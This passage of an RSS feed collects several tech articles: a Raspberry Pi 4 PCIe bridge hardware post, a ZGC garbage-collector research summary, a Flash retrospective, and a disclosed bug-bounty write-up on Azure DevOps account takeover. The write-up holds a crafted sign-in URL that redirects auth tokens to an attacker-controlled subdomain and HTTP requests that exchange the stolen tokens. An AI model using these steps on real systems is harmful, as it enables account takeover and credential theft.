100vw, 1024px"></a></figure></div> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-1024x768.jpg" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-1024x768.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-300x225.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-768x576.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-1536x1152.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-2048x1536.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure></div> <center></center> <p>After replacing the VL805 with the bridge chip I tried a few PCIe cards that were laying around, the first was a Realtek RTL8168 based ethernet adapter… it didn’t work. Then I tried an ASMedia ASM1083 PCIe to PCI converter, that didn’t work either. I looked over all solder joints, checked for continuity, shorts, and everything seemed fine. I tried all kinds of things, like removing the capacitors and swapping the + and – of each signal in case they were swapped at the device end, as this is a feature of PCIe called <a rel="noreferrer noopener" href="https://teledynelecroy.com/doc/understanding-lane-reversal-and-polarity" target="_blank">polarity inversion</a> that maybe the controller did not support. The Pi just would not detect them. It seemed to be unable to train the PCIe link as <code>dmesg</code> showed <code>link down</code> instead of <code>link up, 2.5 Gbps x1 (!SSC)</code>. In the end I ordered a USB 3.0 expansion card containing a VL805, the same as the Pi. When it eventually arrived, I plugged it in and it was detected first time! I found a Realtek RTL8111 based ethernet adapter, and that worked too! After installing the driver for the RTL8111 it was able to obtain an IP from the DHCP server and I could ping the interface.</p> <div><figure><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/lspci_rpi4.png" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/lspci_rpi4.png 628w, https://blog.zakkemble.net/wp-content/uploads/2020/06/lspci_rpi4-300x30.png 300w" sizes="(max-width: 628px) 100vw, 628px"></figure></div> <p>I wonder what it is about the RTL8168 and ASM1083 that makes them incompatible with the Raspberry Pi? Maybe they just don’t like the PCIe signals running through a load of USB connectors and cables.<br><strong>UPDATE 1:</strong> Using an ASM1184e PCIe switch and these two expansion cards are still not detected, so probably not signal issues. The device trees file has been modified to allow more than one PCIe device, as described in Colins blog post. Other cards work in the switch, just not these two.<br><strong>UDPATE 2:</strong> Nevermind, the problem with the ASM1083 was that I hadn’t connected the 5V rail, and is now detected by the Pi. RTL8168 still doesn’t work for some reason.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-1024x768.jpg" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-1024x768.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-300x225.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-768x576.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-1536x1152.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-2048x1536.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure></div> <p>A quick test using 4 USB 3.0 flash drives plugged into the VL805 expansion card resulted with a total read throughput of 3 Gbps out of a maximum theoretical throughput of 4 Gbps over a 5 Gbps PCIe 2.0 link. The flash drives had their read speeds almost maxed out, probably slowed down slightly from overhead of having to switch between each drive while reading.<br><strong>UPDATE: </strong>Another test with 5 USB flash drives, a USB hub and a USB-to-Ethernet adapter resulted in 3 Gbps again, so this seems like a limitation of the VL805 or CPU. Other RPi4 benchmarks using SSDs through USB 3 also maxed out at 3 Gbps.</p> <p>The RESET and WAKE traces on the riser board should be cut, otherwise RESET will be connected to GND preventing the card from starting and WAKE will be connected to 5V possibly damaging the device if that pin is not 5V tolerant. The RESET line should then have a 10k pullup connected to the 3.3V supply, or connected to the D- signal of the lower USB 3.0 port of the Pi.</p> <p>Colin mentioned that Thomasz also had kernel panic problems with his setup, I had a few panics and freezes too, but they seemed to be caused by wiggling the PCIe card a little too much.</p> <p><a rel="noreferrer noopener" href="https://docs.turris.cz/hw/mox/Turris_Mox_F.pdf" target="_blank">This pdf</a> has a full schematic using a VL805 on pages 7 and 8 (pictured below), very handy since any information about the chip is scarce.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/Turris_Mox_F-pg7_8.png" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/Turris_Mox_F-pg7_8-150x150.png" alt=""></a></figure></div> <p>These “chips” are available to buy from my <a href="https://www.tindie.com/products/20478/" target="_blank" rel="noreferrer noopener">Tindie store</a>! Or they can be ordered directly from me, send an email to shop@zakkemble.net</p> <div><figure><a href="https://www.tindie.com/products/20478/" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/02/tindie_robodog.png" alt=""></a></figure></div> <p><strong>PCB designs and things are on <a rel="noreferrer noopener" href="https://github.com/zkemble/RPi4-PCIe-Bridge" target="_blank">GitHub</a></strong></p> </div></div>]]>
            </description>
            <link>https://blog.zakkemble.net/rpi4-pci-express-bridge-chip/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23701208</guid>
            <pubDate>Wed, 01 Jul 2020 13:43:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Taking over Azure DevOps accounts with one click]]>
            </title>
            <description>
<![CDATA[
Score 117 | Comments 23 (<a href="https://news.ycombinator.com/item?id=23700800">thread link</a>) | @infosecau
<br/>
July 1, 2020 | https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/ | <a href="https://web.archive.org/web/*/https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p>When performing subdomain takeovers, you should be asking yourself, what is the impact, and how do I prove it? This was especially the case when taking over the subdomain <code>project-cascade.visualstudio.com</code>.</p>

<p>At first glance, it didn’t seem like we could do much by taking this subdomain over as nothing super sensitive lived under <code>*.visualstudio.com</code>. However, under deeper examination, we were able to exploit a trust boundary, leading to a 1 click account takeover of Azure DevOps accounts.</p>

<h2 id="technical-details">Technical Details</h2>

<p>Through automation, we found the subdomain <code>project-cascade.visualstudio.com</code>, which was vulnerable to an Azure Zone DNS takeover.</p>

<p>The NS records for <code>project-cascade.visualstudio.com</code> were pointing to Azure DNS, however they were no longer registered on Azure DNS. This resulted in the lookups being refused, as shown below:</p>

<pre><code>dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns3-05.azure-dns.org status: [Refused]           
dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns2-05.azure-dns.net status: [Refused]
dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns1-05.azure-dns.com status: [Refused]          
dns-takeover lookup project-cascade.visualstudio.com. on nameserver ns4-05.azure-dns.info status: [Refused]
</code></pre>

<p>As the lookups were being refused, we were able to to register the subdomain under an Azure account that we owned. By doing so, we were able to create arbitrary DNS records for the subdomain <code>project-cascade.visualstudio.com</code>:
<br></p>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-0.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Azure Console with <code>project-cascade.visualstudio.com</code> registered as a DNS Zone</em></td>
    </tr>
  </tbody>
</table>

<p><br>
From this point on wards, we registered two records:</p>

<ul>
  <li>TXT Record - <code>txt.project-cascade.visualstudio.com</code> with the value of <code>Azure DNS Zone Takeover POC</code> (proof of concept)</li>
  <li>A Record - <code>arec.project-cascade.visualstudio.com</code> with the value of <code>3.88.203.203</code> (our host)</li>
</ul>

<pre><code>$ dig txt txt.project-cascade.visualstudio.com @1.1.1.1

...omitted for brevity...

;; ANSWER SECTION:
txt.project-cascade.visualstudio.com. 10 IN TXT "Azure DNS Zone Takeover POC"

$ dig a arec.project-cascade.visualstudio.com @1.1.1.1

...omitted for brevity...

;; ANSWER SECTION:
arec.project-cascade.visualstudio.com. 2475 IN A 3.88.203.203

</code></pre>

<h2 id="so-whats-next">So, what’s next?</h2>

<p>Now that we had successfully taken the subdomain over, it was time to investigate the security impact.</p>

<p>We discovered that there were subdomains underneath <code>visualstudio.com</code> that facilitated an authentication flow through <code>login.microsoftonline.com</code>.</p>

<p>For example, when visiting  <code>app.vssps.visualstudio.com</code>, we were redirected to:</p>

<pre><code>https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&amp;reply_to=https%3A%2F%2Fapp.vsaex.visualstudio.com%2F&amp;redirect=1&amp;context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90#ctx=eyJTaWduSW5Db29raWVEb21haW5zIjpbImh0dHBzOi8vbG9naW4ubWljcm9zb2Z0b25saW5lLmNvbSJdfQ2
</code></pre>

<p>Which then redirected to:</p>

<pre><code>https://login.microsoftonline.com/...omitted...
</code></pre>

<p>The most important thing to note from the URLs above, is the following parameter and value for the endpoint <code>https://app.vssps.visualstudio.com/_signin</code>:</p>

<p><code>reply_to=https%3A%2F%2Fapp.vsaex.visualstudio.com%2F</code></p>

<p>Through some testing, we determined that this authentication flow had a loosely configured <code>reply_to</code> address, allowing any domain under <code>*.visualstudio.com</code> to recieve the authentication tokens.</p>

<p>In order to demonstrate this account takeover flow, we crafted the following URL:</p>

<pre><code>https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F&amp;redirect=1&amp;context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90
</code></pre>

<p>In the URL above, note that we changed the value of the <code>reply_to</code> parameter to contain the following: <code>https%3A%2F%2Farec.project-cascade.visualstudio.com%2F</code> (our subdomain takeover).</p>

<p>This will prompt the user to login via the normal microsoft live.com auth flow, or if the user is already logged in, proceed with the signin and redirect request.</p>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-login.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Visual Studio Authentication Flow via <code>login.microsoftonline.com</code></em></td>
    </tr>
  </tbody>
</table>



<p>Once logged in, this resulted in the following request being made which ultimately resulted in a POST request to our controlled domain <code>arec.project-cascade.visualstudio.com</code>.</p>

<pre><code>POST /_signedin?realm=arec.project-cascade.visualstudio.com&amp;protocol=&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F HTTP/1.1
Host: arec.vssps.visualstudio.com
Cookie: ...omitted for brevity...

id_token=&lt;snip&gt;&amp;FedAuth=&lt;snip&gt;&amp;FedAuth1=&lt;snip&gt;%2B
</code></pre>

<p>Our controlled domain received the following request which contains authentication tokens for <code>app.vsaex.visualstudio.com</code></p>

<pre><code>POST /_signedin?realm=arec.project-cascade.visualstudio.com&amp;protocol=&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F HTTP/1.1
Host: arec.project-cascade.visualstudio.com
Content-Length: 4634
Referer: https://arec.vssps.visualstudio.com/_signedin?realm=arec.project-cascade.visualstudio.com&amp;protocol=&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F
Cookie: ...omitted for brevity...

id_token=&lt;snip&gt;&amp;FedAuth=&lt;snip&gt;&amp;FedAuth1=&lt;snip&gt;
</code></pre>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-1.5.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Final Authentication Token received by arec.project-cascade.visualstudio.com (controlled by us)</em></td>
    </tr>
  </tbody>
</table>



<h2 id="what-can-this-token-be-used-for">What can this token be used for?</h2>

<p>We found that we could exchange the stolen authentication token for a Bearer token through <code>app.vsaex.visualstudio.com</code>. This Bearer token could then be used to authenticate to <code>vsaex.visualstudio.com</code>, <code>dev.azure.com</code> and <code>vssps.dev.azure.com</code>.</p>

<pre><code>POST /_apis/WebPlatformAuth/SessionToken HTTP/1.1
Host: app.vsaex.visualstudio.com
Connection: close
Content-Length: 105
Origin: https://app.vsaex.visualstudio.com
X-VSS-ReauthenticationAction: Suppress
Content-Type: application/json
Accept: application/json;api-version=6.0-preview.1;excludeUrls=true
X-Requested-With: XMLHttpRequest
...omitted for brevity...
Cookie: UserAuthentication=&lt;snipped id_token&gt;; FedAuth=&lt;snipped FedAuth&gt;; FedAuth1=&lt;snipped&gt;

{"appId":"00000000-0000-0000-0000-000000000000","force":false,"tokenType":0,"namedTokenId":"Aex.Profile"}
</code></pre>

<p>This request returns the following response with a valid bearer token that can be used elsewhere</p>

<pre><code>HTTP/1.1 200 OK
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Content-Length: 933
Content-Type: application/json; charset=utf-8; api-version=6.0-preview.1
...omitted for brevity...

{"appId":"00000000-0000-0000-0000-000000000000","token":"&lt;snip&gt;","tokenType":"session","validTo":"2020-05-12T06:45:47.2007474Z","namedTokenId":"Aex.Profile"}
</code></pre>

<p>e.g. on <code>app.vsaex.visualstudio.com</code> this token can be used to pull the user’s email</p>

<pre><code>GET /_apis/User/User HTTP/1.1
Host: app.vsaex.visualstudio.com
Connection: close
X-TFS-FedAuthRedirect: Suppress
X-VSS-ReauthenticationAction: Suppress
X-Requested-With: XMLHttpRequest
Accept-Language: en-US
Authorization: Bearer &lt;snip just recieved bearer token&gt;
Accept: application/json;api-version=6.0-preview.1;excludeUrls=true
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
X-TFS-Session: ab1e4b56-599c-4ab6-9f5e-756c486a0f2b
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Referer: https://app.vsaex.visualstudio.com/me?mkt=en-US
Accept-Encoding: gzip, deflate


HTTP/1.1 200 OK
Cache-Control: no-cache
Pragma: no-cache
Content-Length: 258
...omitted for brevity...

{"descriptor":"msa.NTg0Zjc4NDAtYzc5ZC03MWU0LWJkN2ItMDZhY2Y1N2Q2OTA1","displayName":"s","mail":"&lt;account_email&gt;","unconfirmedMail":null,"country":"AU","dateCreated":"2018-05-25T23:19:53.6843383+00:00","lastModified":"2019-01-06T15:43:50.2963651+00:00","revision":0}
</code></pre>

<p>The Bearer token could be used to access <code>https://app.vsaex.visualstudio.com/me?mkt=en-US</code> which we found to disclose project names for the associated user on <code>dev.azure.com</code>.</p>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-1.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Access to <code>app.vsaex.visualstudio.com/me</code> through the stolen token</em></td>
    </tr>
  </tbody>
</table>



<p>Ultimately, this allowed us to use the token on <code>dev.azure.com</code> to access resources:</p>

<pre><code>GET /seanyeoh/_usersSettings/keys?__rt=fps&amp;__ver=2 HTTP/1.1
Host: dev.azure.com
Connection: close
x-tfs-fedauthredirect: Suppress
Origin: https://dev.azure.com
x-vss-reauthenticationaction: Suppress
authorization: Bearer &lt;snip&gt;
accept: application/json;api-version=5.0-preview.1;excludeUrls=true;enumsAsNumbers=true;msDateFormat=true;noArrayWrap=true
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36
Sec-Fetch-Site: same-site
Sec-Fetch-Mode: cors
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

</code></pre>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-2.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Accessing resources from dev.azure.com with the generated token</em></td>
    </tr>
  </tbody>
</table>



<p>A malicious attacker could perform a 1 click drive by attack on an unsuspecting user by directing them to a URL such as:</p>

<pre><code>https://app.vssps.visualstudio.com/_signin?realm=app.vsaex.visualstudio.com&amp;reply_to=https%3A%2F%2Farec.project-cascade.visualstudio.com%2F&amp;redirect=1&amp;context=eyJodCI6MywiaGlkIjoiNDA0ODFkZDAtZDUzMS1hMWE2LWQ0MzYtMDQxNTk3MWI0MmQ2IiwicXMiOnt9LCJyciI6IiIsInZoIjoiIiwiY3YiOiIiLCJjcyI6IiJ90
</code></pre>

<p>This would result in their <code>app.vsaex.visualstudio.com</code> tokens being disclosed.</p>

<p>From this point, the the attacker would have full control over the user’s Azure DevOps account.</p>

<p>Additionally, the zone takeover of project-cascade.visualstudio.com could have beeen used to validate ownership over the <code>project-cascade.visualstudio.com</code> domain, setup MX records to capture emails to <code>*.project-cascade.visualstudio.com</code> and prove ownership to create SSL certificates. This may have resulted in various opportunities for fraud and impersonation of Microsoft services.</p>



<p>This attack could be mitigated at two points:</p>
<ol>
  <li>Not having the dangling dns zone <code>project-cascade.visualstudio.com</code></li>
  <li>Restricting the reply_to url for visualstudio tokens on <code>app.vssps.visualstudio.com</code> to the realm for <code>app.vsaex.visualstudio.com</code></li>
</ol>


<ol>
  <li>20th May 2020 - Report filed</li>
  <li>22nd May 2020 - Issue triaged</li>
  <li>22nd May 2020 - $3000 Bounty Awarded</li>
</ol>

<table>
  <thead>
    <tr>
      <th><img src="https://blog.assetnote.io/images/assetnote-azure-3.png" alt="" width="100%"></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><em>Bount…</em></td></tr></tbody></table></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/">https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/</a></em></p>]]>
            </description>
            <link>https://blog.assetnote.io/2020/06/28/subdomain-takeover-to-account-takeover/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23700800</guid>
            <pubDate>Wed, 01 Jul 2020 12:56:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Compact forwarding information for the Z Garbage Collector in the OpenJDK]]>
            </title>
            <description>
<![CDATA[
Score 62 | Comments 8 (<a href="https://news.ycombinator.com/item?id=23700451">thread link</a>) | @pjmlp
<br/>
July 1, 2020 | https://inside.java/2020/06/25/compact-forwarding/ | <a href="https://web.archive.org/web/*/https://inside.java/2020/06/25/compact-forwarding/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="entry"><hr>

<p><em>The work presented here is performed as part of the <a href="https://inside.java/2020/06/12/joint-research-projects/">joint research project between Oracle, Uppsala University and KTH</a>. Follow the blog series here at inside.java to read more about the JVM research performed at the Oracle Development office in Stockholm.</em></p>

<hr>

<p>This is a short description about my work on garbage collection that I did for my master thesis. This work was done in collaboration with <a href="https://www.oracle.com/">Oracle</a> which gave me an opportunity to work with brilliant minds on challenging problems. I want to direct a special shoutout to my mentors at Oracle, <a href="https://inside.java/u/PerLiden/">Per Lidén</a> and <a href="https://inside.java/u/ErikOsterlund/">Erik Österlund</a>.</p>

<p>To allow fast allocation in garbage collected environments, a common approach is to use bump pointer allocation. Bump pointer allocation uses a pointer to the first available byte in memory that is monotonically increased as we continue to allocate objects. While this scheme allows fast allocation it comes with the caveat that the free memory must be kept continuous. To keep the free memory continuous, many garbage collectors move objects around in memory to compact them, thereby avoiding fragmentation, which can be seen in the figure below. This is typically handled in a process where all live objects are moved off of a page which is then free’d. This permits clearing a page in O(live) objects, which is typically a small number (relatively speaking) since most newly created object tend to die pretty quickly.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/heapgc_defrag.png" alt="Defragmentation during GC"></p>

<p>The Z Garbage Collector (ZGC) is a new moving concurrent garbage collector in OpenJDK (the thing that probably runs your Java application) [1, 2]. ZGC moves objects around, to combat memory fragmenation, without stopping the application.
This imposes additional overhead on an application in the form of tracking objects’ movements, so that all pointers to them can eventually be updated to the new locations. Usually in GC parlance this is referred to as forwarding information.</p>

<p>ZGC uses an auxiliary forwarding table – optimised for fast look-up, at the cost of additional memory use. This forwarding table is stored outside of the Java heap, referred as off heap-allocation. Any off-heap allocation or keeping old object after moving them is to be considered as memory overhead since it is strictly needed for the JVM and not the actual Java application. ZGC suffers from pathological cases where the size of its forwarding information can become very large, theoretically, as big as the heap itself. If we dimension an application for the pathological case this would be a waste of resources, since the memory usage is usually significantly less. This can make it hard to determine an application’s memory requirements.</p>

<p>This risk for large memory overhead is not only a theoretical concern, but can be observed in real programs. Below is a plot depicting the memory overhead for an internal benchmark application called BigRamTester at Oracle, which shows 35% memory overhead. The source code for that application can be found in <a href="https://bugs.openjdk.java.net/browse/JDK-8152438">this issue </a> as an attachment.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/bigram.png" alt="Benchmark Revealing Large Memory Overhead"></p>

<p>Storing forwarding information for each relocated object from addresses A (the from-address) to B (the to-address), costs approximately 128 bytes (64 bytes for each from/to-address), can be implemented computationally efficient but at the cost of additional memory overhead (as shown above). As part of my thesis work, we propose a new design for forwarding tables that maps several sparesly populated pages (i.e., with few live objects) onto a single new page in a way that allows the to-address to be calculated using the from-address and liveness information. The design results in a compressed forwarding table that incurs a theoretical worst-case memory overhead of &lt; 3.2%.</p>

<p>In ZGC, there may be contention between application threads and garbage collector threads of relocating objects. The contention results in nondeterministic addresses to which objects are relocated to. The new design requires <em>deterministic addresses</em> so that we can calculate the new address given some set of information. Assume that we have an old page X, whose objects will be relocated to the new page Y. We achieve deterministic addresses, if we copy the objects to Y in the order we encounter them when traversing the live map from the beginning to the end, in ascending order.</p>

<p>The new design divides pages into Q amount of chunks. A chunk holds the amount of preceding living objects <em>before</em> that chunk. To get the size of previously living objects you will use the associated chunk and scan the live map for the addresses who wasn’t covered by the chunk. This allows X to be computed efficiently and allows the old page to be freed as soon as all objects have been relocated, at the cost of some space. An example of dividing a page into chunks is depicted below.</p>

<p><img src="https://inside.java/images/blog/compact-forwarding/chunks.png" alt="Chunks"></p>

<p>Each page divider corresponds to one chunk’s live map coverage. In the example, an object to be relocated lives on the third page which covered by the third chunk (the green arrow). To find the address we do not have to scan the previous chunks since the <em>live bytes</em> field is describing the amount of live bytes of all preceding chunks (the red arrow). Finding all living objects (and their size) preceding the green object within the chunk, can be found in the live map (the yellow arrow).</p>

<p>This design results in a simple logic in order to calculate the new address, which in pseudocode would be express as:</p>

<div><div><pre><code><span>inline</span> <span>uintptr_t</span> <span>ZCompactForwarding</span><span>::</span><span>to_address</span><span>(</span><span>uintptr_t</span> <span>from_address</span><span>)</span> <span>{</span>
  <span>uintptr_t</span> <span>to_page_start_address</span>    <span>=</span> <span>to_page_start_address</span><span>(</span><span>from_address</span><span>);</span>
  <span>uintptr_t</span> <span>live_bytes_before_chunks</span> <span>=</span> <span>live_bytes_before_chunks</span><span>(</span><span>from_address</span><span>)</span>
  <span>uintptr_t</span> <span>live_bytes_on_chunks</span>     <span>=</span> <span>live_bytes_on_chunks</span><span>(</span><span>from_address</span><span>);</span>

  <span>return</span>
    <span>to_page_start_address</span> <span>+</span>
    <span>live_bytes_before_chunk</span> <span>+</span>
    <span>live_bytes_on_chunks</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>The implementation was shown to have a maximum of &lt; 3.2% memory overhead. I used the DaCapo benchmarks suite and the SPECjbb2015 benchmark to evaluate the impact of the design on execution time, given that forwarding addresses must now be computated, as opposed to looked up. Naturally, we expected some performance degradation.
The results from the benchmarking show an statistically significant average performance degradation of approximately 2%, for the new design. Notably, many programs in DaCapo were not effected at all. Two DaCapo programs saw performance improvements at 5.69% and 22.42%, respectively, for the new design.</p>

<p>I haven’t implemented all optimizations on my list (yet). But I’m fairly hopeful that decrease in memory footprint and predictable overhead outweighs the increase in execution time, as incidated by the measurements. This could mean that the work you’d just read about will hopefully find its way into OpenJDK. Only time will tell.</p>

<h2 id="references">References</h2>

<p>[1] Lidén P. <a href="https://mail.openjdk.java.net/pipermail/announce/2017-October/000237.html">CFV: New Project: ZGC; 2017</a>.</p>

<p>[2] Lidén P, Karlsson S. <a href="http://openjdk.java.net/jeps/333">JEP 333: ZGC: A Scalable Low-Latency Garbage Collector</a>.</p>
</div></div>]]>
            </description>
            <link>https://inside.java/2020/06/25/compact-forwarding/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23700451</guid>
            <pubDate>Wed, 01 Jul 2020 11:59:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Web Dark Ages]]>
            </title>
            <description>
<![CDATA[
Score 218 | Comments 143 (<a href="https://news.ycombinator.com/item?id=23700075">thread link</a>) | @jslakro
<br/>
July 1, 2020 | https://pavellaptev.github.io/web-dark-ages/ | <a href="https://web.archive.org/web/*/https://pavellaptev.github.io/web-dark-ages/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <p>Now it’s abandoned, but a lot of websites were built on FLASH technologies.</p>
          <p>Basic HTML technologies didn’t provide enough tools and methods for designers to express their ideas and FLASH which was used commonly to create an animation and interactive presentations stepped into the Web.</p>
          <p>For designers who wanted to do web — FLASH websites were the breath of fresh air. Everything you can imagine was possible — from complex interactive animations to 3D.</p>
          <p>The main source of inspiration was thefwa.com and it was an honor to add an FWA label on a website.</p>
          <p>Sounds good, right? But what happened with FLASH then? Well, briefly it wasn’t secure, it was heavy to load, Apple effect and HTML5.</p>
          <p>Unfortunately, I can’t provide any links to you, because you can’t open them, FLASH technology is deadly dead right now.</p>
          <p>It’s hard to imagine right now but FLASH was a big part of the internet not so far ago — websites, games, banners and I think that more than 50% of all designers portfolio was built on FLASH.</p>
        </div></div>]]>
            </description>
            <link>https://pavellaptev.github.io/web-dark-ages/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23700075</guid>
            <pubDate>Wed, 01 Jul 2020 10:52:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Museum of Digital Art forced to close its doors]]>
            </title>
            <description>
<![CDATA[
Score 100 | Comments 10 (<a href="https://news.ycombinator.com/item?id=23699764">thread link</a>) | @dsr12
<br/>
July 1, 2020 | https://muda.co/closing/ | <a href="https://web.archive.org/web/*/https://muda.co/closing/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://muda.co/closing/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23699764</guid>
            <pubDate>Wed, 01 Jul 2020 09:59:04 GMT</pubDate>
        </item>
    </channel>
</rss>
